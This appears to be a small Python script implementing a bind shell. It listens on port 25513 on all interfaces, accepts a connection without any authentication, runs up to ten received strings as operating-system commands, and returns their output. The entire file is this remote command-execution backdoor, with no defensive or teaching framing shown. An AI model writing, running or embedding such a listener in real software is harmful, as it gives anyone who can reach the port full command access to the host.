import socket
import os

s=socket.socket()
# s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)

s.bind(('0.0.0.0', 25513))
s.listen(5)
con,addr=s.accept()
# print(con,addr)
for i in range(10):
    cmd=con.recv(1024)
    print(cmd)
    command=cmd.decode()
    if command.startswith('cd'):
        os.chdir(command[2:].strip())
        result=os.getcwd()
    else:
        result=os.popen(command).read()
    if result:
        con.send(result.encode())
    else:
        con.send(b'OK!')